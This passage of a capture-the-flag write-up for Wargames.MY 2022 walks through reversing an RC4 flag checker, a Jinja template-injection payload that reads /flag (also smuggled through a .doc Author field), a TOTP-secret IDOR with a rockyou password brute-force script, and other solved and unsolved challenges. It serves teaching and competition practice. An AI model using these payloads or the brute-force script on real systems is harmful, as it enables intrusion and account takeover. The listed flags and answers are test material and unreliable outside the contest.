AF0UfQGIAHwBfAFkABcAhQIZAJECcQRTACkBchMAAAByAwAAACkC2gIuMHIYAAAAKQFyBAAAAHIDAAAAcgYAAAD6CjxsaXN0Y29tcD41AAAAcwIAAAAGAHoWZjguPGxvY2Fscz4uPGxpc3Rjb21wPnIUAAAAchMAAABjAQAAAAAAAAACAAAABgAAABMAAABzHAAAAGcAfABdFH0BiAB8AXwBZAAXAIUCGQCRAnEEUwApAXITAAAAcgMAAAApAnIbAAAAchgAAAApAXIFAAAAcgMAAAByBgAAAHIcAAAANgAAAHMCAAAABgDaCDAwMDAwMDAwYwEAAAAAAAAAAgAAAAUAAABTAAAAcyIAAABnAHwAXRp9AXQAfAGDAWQAZAGFAhkAoAFkAqEBkQJxBFMAKQPpAgAAAE5yEwAAACkC2gNiaW7aBXpmaWxsKQJyGwAAAHIYAAAAcgMAAAByAwAAAHIGAAAAchwAAAA4AAAAcwIAAAAGAOkAAQAAch4AAAByEQAAANoIMDAwMDAwMDEpBXIWAAAA2gNsZW5yGQAAANoDaW50choAAAApCHIEAAAAcgUAAAByCwAAANoDYm94chgAAAByDAAAANoDb3V02gRjaGFycgMAAAApAnIEAAAAcgUAAAByBgAAANoCZjg0AAAAcyAAAAAAAR4BHgEEARIBDgEgASoBBAEEAQQBCgEKARQBMgE2AXIoAAAA2ogwMDExMDEwMTAwMTEwMDAxMDExMDExMDEwMTExMDAwMDAwMTEwMDAxMDExMDAxMDEwMTAxMDAwMDAxMDAwMDAwMDEwMTAwMTEwMDEwMDEwMDAxMDEwMTExMDAxMTAwMDAwMTExMDAxMDAxMDAwMTAwMDExMDEwMTEwMDExMDAxMTAxMDExMDAxehBHaW1tZSB0aGUgZmxhZzogchQAAADpBQAAAHoFd2dteXtyEgAAANoBfekmAAAAchEAAABjAQAAAAAAAAACAAAABQAAAEMAAABzIgAAAGcAfABdGn0BdAB8AYMBZABkAYUCGQCgAWQCoQGRAnEEUwApA3IeAAAATnITAAAAKQJyHwAAAHIgAAAAKQJyGwAAANoBZnIDAAAAcgMAAAByBgAAAHIcAAAASQAAAHMCAAAABgByHAAAAHoFdXRmLTgpAdoIZW5jb2RpbmfBMAEAADEwMTEwMDAxMTAxMDExMDAxMTExMDEwMTAxMTAxMTAwMTAwMTAwMDEwMTAxMTAwMDAwMDAwMDAwMDExMDAxMTAwMTEwMTAwMTExMTAxMDAwMDEwMTAwMDEwMDAwMTAxMDExMTEwMTExMTAwMDAxMTAxMDExMDExMTAwMDExMTEwMTEwMTEwMTEwMTExMTAwMTEwMTExMDExMDAxMTEwMDAwMTAwMDAwMTEwMDAwMDAwMTAwMTEwMTAwMDAxMDEwMTExMTAwMTAxMDEwMTExMDAwMTAwMDEwMDAxMTAwMDAxMDAxMDEwMDAwMTExMTAxMTExMDAxMTExMDEwMTExMTAxMDEwMTExMTExMTAxMTAwMDAxMDEwMDEwMTAwMTExMTAxMDEwMDEwMDExMDAwMTB6DUNvcnJlY3QgZmxhZyF6DFdyb25nIGZsYWcuLnoSV3JvbmcgZmxhZyBmb3JtYXQhTikPcgcAAAByCAAAAHIJAAAAcgoAAAByEAAAAHIZAAAAchoAAAByKAAAANoBa9oFaW5wdXTaBGZsYWdyIwAAANoEam9pbtoFYnl0ZXPaBXByaW50cgMAAAByAwAAAHIDAAAAcgYAAADaCDxtb2R1bGU+AgAAAHMeAAAACAcIBwgHCAUIBggLCAcIEgQBCAEoARwBDgEKAgoC
```
</details>

#### Decompiling the bytecode
We can proceed to do decompailation of the python bytecode with any decompilation tool, [uncompyle6](https://github.com/rocky/python-uncompyle6/) gave best result for me.
<details>
<summary>Decompiled <code>ular.pyc</code>, now <code>ular.py</code></summary>

```py
# uncompyle6 version 3.9.0
# Python bytecode version base 3.7.0 (3394)
# Decompiled from: Python 3.8.10 (tags/v3.8.10:3d8993a, May  3 2021, 11:48:03) [MSC v.1928 64 bit (AMD64)]
# Embedded file name: ular.py


def f1(a, b):
    if a == '1':
        if b == '1':
            return '1'
    return '0'


def f2(a, b):
    if a == '0':
        if b == '0':
            return '0'
    return '1'


def f3(a):
    if a == '1':
        return '0'
    if a == '0':
        return '1'


def f4(a, b):
    return f2(f1(a, f3(b)), f1(f3(a), b))


def f5(x, y, z):
    s = f4(f4(x, y), z)
    c = f2(f1(x, y), f1(z, f2(x, y)))
    return (s, c)


def f6(a, b):
    ans = ''
    z = '0'
    a = a[::-1]
    b = b[::-1]
    for i in range(8):
        ans += f5(a[i], b[i], z)[0]
        z = f5(a[i], b[i], z)[1]

    return ans[::-1]


def f7(a, b):
    ans = ''
    for i in range(8):
        ans += f4(a[i], b[i])

    return ans


def f8(a, b):
    a = [a[i:i + 8] for i in range(0, len(a), 8)]
    b = [b[i:i + 8] for i in range(0, len(b), 8)]
    x = '00000000'
    box = [bin(i)[2:].zfill(8) for i in range(256)]
    for i in range(256):
        x = f6(f6(x, box[i]), b[i % len(b)])
        box[i], box[int(x, 2)] = box[int(x, 2)], box[i]

    x = '00000000'
    y = '00000000'
    out = ''
    for char in a:
        x = f6(x, '00000001')
        y = f6(y, box[int(x, 2)])
        box[int(x, 2)], box[int(y, 2)] = box[int(y, 2)], box[int(x, 2)]
        out += f7(char, box[int(f6(box[int(x, 2)], box[int(y, 2)]), 2)])

    return out


k = '0011010100110001011011010111000000110001011001010101000001000000010100110010010001010111001100000111001001000100011010110011001101011001'
flag = input('Gimme the flag: ')
if flag[0:5] == 'wgmy{':
    if flag[-1] == '}' and len(flag) == 38:
        flag = ''.join([bin(f)[2:].zfill(8) for f in bytes(flag, encoding='utf-8')])
        if f8(flag, k) == '1011000110101100111101010110110010010001010110000000000001100110011010011110100001010001000010101111011110000110101101110001111011011011011110011011101100111000010000011000000010011010000101011110010101011100010001000110000100101000011110111100111101011110101011111110110000101001010011110101001001100010':
            print('Correct flag!')
    else:
        print('Wrong flag..')
else:
    print('Wrong flag format!')
```
</details>

We can see that it expects a flag input, encrypts it with `f8` and compare with the encrypted flag.

#### Getting the flag
Pondering more on the `f8` function, we can deduce that it is actually a [RC4](https://en.wikipedia.org/wiki/RC4) encryption function, taking (a, b) as (message, key). As the key was already given as `k`, we can just use a [RC4 decryption service](https://www.dcode.fr/rc4-cipher) to help us decrypt the message. A successful decryption gives the flag `wgmy{e52e6ed6345087ed01e14c643bc0429b}`.


## Web
### Christmas Wishlist
> Submit your wishlist at this [website!](http://wishlist.wargames.my/)

[*Back to top*](#table-of-contents)
<details>
<summary>Source of <code>app.py</code></summary>

```py
from flask import Flask, request, render_template, render_template_string
from waitress import serve
import os
import subprocess

app_dir = os.path.split(os.path.realpath(__file__))[0]
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = f'{app_dir}/upload/'

@app.route('/', methods=['GET','POST'])
def index():
	try:
		if request.method == 'GET':
			return render_template('index.html')

		elif request.method == 'POST':
			f = request.files['file']
			filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename)

			if os.path.exists(filepath) or ".." in filepath:
				return render_template_string("Hohoho.. No present for you")
			
			else:
				f.save(filepath)
				output = subprocess.check_output(
					["/bin/file",'-b', filepath], 
					shell=False, 
					encoding='utf-8',
					timeout=1
				)
				
				if "ASCII text" not in output:
					output=f"<p style='color:red'>Error: The file is not a text file: {output}</p>"
				else:
					output = "You wish for "
					with open(filepath,'r') as f:
						lines = f.readlines()
						output += ', '.join(lines[:-1]) + " and " + lines[-1]

				os.remove(filepath)
				return render_template_string(output)

	except:
		return render_template_string("Error")

if __name__ == '__main__':
	serve(app, host="0.0.0.0", port=3000, threads=1000, cleanup_interval=30)
```
</details>

It's a website that allows user to upload any text file, file content will then be read and passed directly to `render_template_string` for rendering. This creates a textbook [SSTI](https://portswigger.net/research/server-side-template-injection) vulnerability we can exploit.

To read a file, we first need to find the `_io._IOBase` class.<br>
`{{1.__class__.__mro__[1].__subclasses__()}}` lists out all classes available in current runtime. We then get the index of our target class (`92` in this case) and substitute it inside the full payload, which tries to open the flag file located at `/flag` and read it:
```py
{{1.__class__.__mro__[1].__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('/flag').read()}}
```
Submitting the above wish grants us the flag `wgmy{72718ee56cff19d67ddf309de74d160a}`.

### Christmas Wishlist 2
> Someone exploited the previous website, I have upgraded you can submit your wishlist at [my website](http://wishlist2.wargames.my/) again!

[*Back to top*](#table-of-contents)
<details>
<summary>Source of <code>app.py</code></summary>

```py
from flask import Flask, request, render_template, render_template_string
from waitress import serve
import os
import subprocess

app_dir = os.path.split(os.path.realpath(__file__))[0]
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = f'{app_dir}/upload/'

@app.route('/', methods=['GET','POST'])
def index():
	try:
		if request.method == 'GET':
			return render_template('index.html')

		elif request.method == 'POST':
			f = request.files['file']
			filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename)

			if os.path.exists(filepath) or ".." in filepath:
				return render_template_string("Hohoho.. No present for you")
			
			else:
				f.save(filepath)
				output = subprocess.check_output(
					["/bin/file",'-b', filepath], 
					shell=False, 
					encoding='utf-8',
					timeout=1
				)
				
				if "ASCII text" not in output:
					output=f"<p style='color:red'>Error: The file is not a text file: {output}</p>"
				else:
					output="Wishlist received. Santa will check out soon!"

				os.remove(filepath)
				return render_template_string(output)

	except:
		return render_template_string("Error")

if __name__ == '__main__':
	serve(app, host="0.0.0.0", port=3000, threads=1000, cleanup_interval=30)
```
</details>

Diffing the file with the previous challange yields this:
```diff
35,38c35
<                                       output = "You wish for "
<                                       with open(filepath,'r') as f:
<                                               lines = f.readlines()
<                                               output += ', '.join(lines[:-1]) + " and " + lines[-1]
---
>                                       output="Wishlist received. Santa will check out soon!"
```

So the file content is not read anymore. The only dynamic response is the output of `file` command when a non-ASCII file is detected. This means we need to provide a non-text file and somehow control the output of `file` command.<br>
Note that customising filename is out of the question here as filename display is suppressed with the `-b` (brief) option provided to `file`. Command injection is also not possible since the command is not executed as a shell command (`shell=False`).

To find a good gadget, I navigated to a folder storing my recently downloaded files and many temporary files to run `file -b *` on it to get a sense of the verbosity. Out of pure luck, I noticed `file` command is very verbose for `.doc` file's signature, giving the following for one file:
```
Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: Sc, Template: Normal.dotm, Last Saved By: Sc, Revision Number: 3, Name of Creating Application: Microsoft Office Word, Create Time/Date: Sat Dec 24 07:54:00 2022, Last Saved Time/Date: Sat Dec 24 07:55:00 2022, Number of Pages: 1, Number of Words: 0, Number of Characters: 3, Security: 0
```
The target here is obviously the `Author` field. To exploit, we can just create a `.doc` file and adding an author whose name is the payload (same as last one). Submitting the file gives us a christmas wish and a flag: 
`Merry Christmas! Flag: wgmy{79fd0d773b8641b99e76eac31bdd93b1}`.

### Most Friendly App
> I created an account in [this website](http://mfa.wargames.my/), but I lost my authenticator and forgot my password<br>
> Can you help me to get my account back? My username is godam

[*Back to top*](#table-of-contents)
#### Recon
The website featured a simple login page with TOTP authentication on login.

On the TOTP verification page after registration (`/getQR.php?username=user`), a `username` parameter is taken without further authentication. This [IDOR vulnerability](https://portswigger.net/web-security/access-control/idor) allow us to leak any user's TOTP secret, effectively rendering the 2FA process meaningless.

I couldn't find any more weakness other than this after poking around for a while, so I moved on.

#### Password brute-force
A hint later released that says `It is required to brute force his password to solve it` made me got back to this again.

To generate the TOTP programmatically, we can just find a premade library since the algorithm is universal. I used [pyotp](https://github.com/pyauth/pyotp) here. For password, the famous [`rockyou` wordlist](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-20.txt) was used.
<details>
<summary>Brute-force script</summary>

```py
import requests
import pyotp
import threading

HOST = 'http://mfa.wargames.my'
USER = "godam"
TCOUNT = 5

ROCKYOU = r"rockyou.txt"

stats = [None] * TCOUNT
otpkey = {"godam": pyotp.TOTP("RUKTVQSRTNNBWNPCBVHK7TNLW2MBUUW5XWF5HJAUUEPVZVCHIKN3PGBFPTLRJQQ3NQGFX3BKYWXO4DUNEYOT5DSL7KC7K6K5RD32PIY")}

with open(ROCKYOU, 'r', encoding='utf-8') as f:
    passwords = f.read().splitlines()


def auth(sess: requests.Session, usr, pwd) -> bool:
    otp = otpkey[usr]
    sess.get(HOST + "/login.php", params={"username": usr, "password": pwd})
    r = sess.post(HOST + "/verify.php", data={"otp": otp.now()})
    # print(pwd, r.text)
    if "Verified!" in r.text:
        print("Success!", usr, pwd)
        return True
    return False


def brute(wid, username, pwdlist):
    s = requests.Session()
    for p in pwdlist:
        if auth(s, username, p):
            print("Found creds:", username, p)
            return
        stats[wid] = p


if __name__ == "__main__":
    # Was running the script when I'm trying to add multi-threading capability
    # but the valid password was found just after I started my work
    threads = []
    print("Trying for", USER)
    threads.append(threading.Thread(target=brute, args=(0, USER, passwords)))

    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print("Done")
```
</details>

After getting the password (`letmein`), we can login to the account and get the flag `wgmy{a3788e5d9f8fb9650aae12f12e24a0ca}` in the notes tab.

### Eureka!
> http://eureka.wargames.my/
>
> This is a 2-parter kinda, first part is a little bit of good recon, 2nd part > happens a lot more common than you think. Have fun!

*Solved after the CTF ends*

[*Back to top*](#table-of-contents)

#### Recon
Browsing the website presents us with a non-functioning login form, and any visit to non-existent page will get redirected back to the login page.

Therefore we first do some simple reconnaissance by visiting common path such as `robots.txt`.
Interestingly, `robots.txt` exists and the content is as follows:
```
User-agent: *
Disallow: /
Crawl-delay: 60
Disallow: changelog.txt
```
We can see a `Disallow` directive was used here. It is commonly recommended against to use it because it may expose sensitive paths, exactly what happened here.

Over to `changelog.txt`, we see
```
Phase 1 - Add homepage
Phase 2 - Edit homepage + cosmetic update
Phase 3 - Add page for viewing user data (this page go way back)
Phase 4 - Improve page loading <- we are here
Phase 5 - Add custom functions to check items
```
Phase 3 seems interesting, and it seemingly hinted towards [the wayback machine](https://web.archive.org/). So we do a [query](https://web.archive.org/web/*/http://eureka.wargames.my/*) in wayback machine and discovered a new path (`/dataprocess.view.php?id=1`).

#### IDOR with a twist

When we try to visit the page in browser, we get the same 302 redirect to the login page. But if we use a tool that doesn't automatically follow redirects such as `curl` or burp, we can see that it is actually sending a html page within the 302 response, which contains the user name and their description.

From here, we just need to enumerate the `id` until we reach `id=3`, where we will be presented with the flag `wgmy{e80fcfe148ec75639d053a164e91ac22}`.


## Steganography
### Color
> Please message us on discord if you are colorblind (Because I'm easy come, easy go, Little high, little low,)<br>
<img src="https://user-images.githubusercontent.com/37703689/209571174-86a324c1-119b-4d0e-b88d-a6c5711d71b7.png" alt="color" width="240">

[*Back to top*](#table-of-contents)

Description gave a subtle tip by mentioning colourblind. And the QR is really *colourful*, so we assume it is playing tricks on colour channels.

To solve it, launch any capable image manipulation tool (e.g. photoshop/gimp), and scan each QR in each colour channel (RGB). This yields:
```yaml
g: wgmy{a437a259
r: bac0f12d77}
b: 5533b67bae8deb
```
Combining them gives the flag `wgmy{a437a2595533b67bae8debbac0f12d77}`.

## Boot2root
### Sanity Check (TryHackMe)
> Please use the link below to learn how to use TryHackMe platform. Submit the root flag located in /root/root.txt
>
> Link: https://tryhackme.com/jr/wgmysanitycheck

[*Back to top*](#table-of-contents)

As the title and description implies, this is not an actual challange. Just follow all the instruction and `cat` the flag by connecting to the server via SSH.

## OSINT
Solved by teammate, refer [here](https://gist.github.com/yayadontknow/0f5c0da132eb7bea0406fc6762233fb3).
[*Back to top*](#table-of-contents)
### Where Am I
> Find the place. (Caught in a landside, No escape from reality)<br>
![whereami](https://user-images.githubusercontent.com/37703689/209573164-e6f09fb9-27ee-4c91-979c-5df3db873526.jpg)

[Writeup link](https://gist.github.com/yayadontknow/0f5c0da132eb7bea0406fc6762233fb3#where-am-i)

### Who Am I
> Find me. (Is this the real life? Is this just fantasy?)<br>
![whoami](https://user-images.githubusercontent.com/37703689/209573167-138e97a1-aed4-43c8-a59b-7effde39e4cc.png)

[Writeup link](https://gist.github.com/yayadontknow/0f5c0da132eb7bea0406fc6762233fb3#whoami)

[*Back to top*](#table-of-contents)


# Unsolved Challenges
## [Misc: Core](https://daniao.ws/wargamesmy-22/core)
> I lost my key file for this program, luckily I have a coredump file. Can you help me to recover the key for me?

## [Reverse: OldVault](https://davidtan0527.github.io/posts/wargamesmy2022/oldvault)
> I found this old cd rom in the basement, my father said its a vault he couldn't open and contains a treasure of some kind

## [OSINT: When am I](https://github.com/DeathReaper-22/WGMY2022-CTF/blob/main/Wargames%202022%20CTF%20Writeup.pdf )
> Find the "time". (Open your eyes, Look up to the skies and see,) (This challenge is not sponsred by h****ive)

## [Cryptography: HMAC master](https://mechfrog88.github.io/wargames-2022#hmac-master)
> Prove you're a HMAC master by Connect with nc 54.255.181.88 2000
<details>
<summary>Source of <code>server.py</code></summary>

```py
#!/usr/bin/env python3
import hashlib
import os
from secret import flag

try:
	print("Welcome to the HMAC master challenge!")
	print("Answer all 3 questions to get the flag!\n")

	print("Now give me two different messages that have the same MD5 hash!")
	a = input("Message A: ")
	b = input("Message B: ")
	if a == b:
		print("Both message cannot be the same! Aborting..")
		exit()
	elif hashlib.md5(bytes.fromhex(a)).hexdigest() != hashlib.md5(bytes.fromhex(b)).hexdigest():
		print("Oops.. See you next time!")
		exit()
	print("You solved the first question!\n")

	print("Now the second question")
	print("Give me a message, then I will give the MD5 hash after I preappend a secret key")
	print("Next you need to give me another message and the corresponding hash after preappended the secret key")
	KEY = os.urandom(8)
	a = input("Message A: ")
	h = hashlib.md5(KEY+bytes.fromhex(a)).hexdigest()
	print(f"MD5(KEY+A): {h}")
	b = input("Message B: ")
	h2 = hashlib.md5(KEY+bytes.fromhex(b)).hexdigest()
	if a == b: 
		print("Both messages cannot be the same! Aborting..")
		exit()
	elif input("MD5(KEY+B): ") != h2:
		print("Oops.. See you next time!")
		exit()
	print("Good Job!\n")

	print("Now the final question, is the another way around")
	print("Give me a message, then I will give the MD5 hash after I append a secret key behind")
	print("Next you need to give me another message and the corresponding hash after appended the secret key")

	KEY = os.urandom(8)
	a = input("Message A: ")
	h = hashlib.md5(bytes.fromhex(a)+KEY).hexdigest()
	print(f"MD5(A+KEY): {h}")
	b = input("Message B: ")
	h2 = hashlib.md5(bytes.fromhex(b)+KEY).hexdigest()
	if a == b:
		print("Both message cannot be the same! Aborting..")
		exit()
	elif input("MD5(B+KEY): ") != h2:
		print("Oops.. See you next time!")
		exit()
	print(f"Congrats HMAC master!! Here is your flag: {flag}")
except Exception as e:
	print("HACKER ALERT!! Aborting..")
```
</details>

## [Cryptography: E-Signature](https://mechfrog88.github.io/wargames-2022#e-signature)
> I made a E-Signature service! Try it now by connect with nc 54.255.181.88 3000

## [Cryptography: Corrupted](https://mechfrog88.github.io/wargames-2022#corrupted)
> My private key was corrupted, luckily still got half is not corrupted Can you help me to recover the private key? I got an important file on my server
Login my server using godam@178.128.106.114 port 2222

## [Steganography: Puzzle](https://mechfrog88.github.io/wargames-2022#puzzle)
> - Is the original always better?
> - Maybe, should we check? (I'm just a poor boy, I need no sympathy,)
<details>
<summary>Download links</summary>

Download: https://drive.google.com/file/d/1otlGp3HCw9RuKd5zYHRTFzkPe3wMfmvI/view?usp=share_link<br>
Mirror: https://drive.google.com/file/d/1xFpgoo3rt-8LjCXp-9_FloL_CuIbRWQQ/view?usp=share_link
</details>

## [Boot2root: D00raemon](https://mechfrog88.github.io/wargames-2022#d00raemon-user)
> User flag located in /home//user.txt<br>
> Root flag located in /root/root.txt<br>
> Link: http://tryhackme.com/jr/wgmy2022easy1

## [Boot2root: Emerald](https://drive.google.com/file/d/1qsWiNiKIx7TdOcCV0f4peSksc7Ubhqjr/view)
> ! Compromise The Domain !<br>
> User flag located in C:\Users<user>\Desktop\user.txt<br>
> Root flag located in C:\Users\Administrator\Desktop\root.txt<br>
>
> Credentials: Username: pawn Password: WGMY2022!<br>
> Link: https://tryhackme.com/jr/wgmy2022hard

[*Back to top*](#table-of-contents)
